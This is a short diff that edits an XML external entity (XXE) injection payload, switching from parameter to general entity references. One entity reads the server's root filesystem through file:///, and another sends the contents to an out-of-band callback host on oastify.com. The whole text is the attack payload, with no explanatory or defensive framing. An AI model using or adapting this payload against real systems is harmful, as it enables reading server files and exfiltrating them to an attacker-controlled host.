@@ -1,5 +1,5 @@
 
-<!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///">
+<!DOCTYPE foo [ <!ENTITY file SYSTEM "file:///">
 <!ENTITY exfil SYSTEM 'http://ezhu6yj9r42ejtmrlesegvnpcgi76xum.oastify.com?x=%file;'> ]>
-%file
-%exfil
+&file
+&exfil
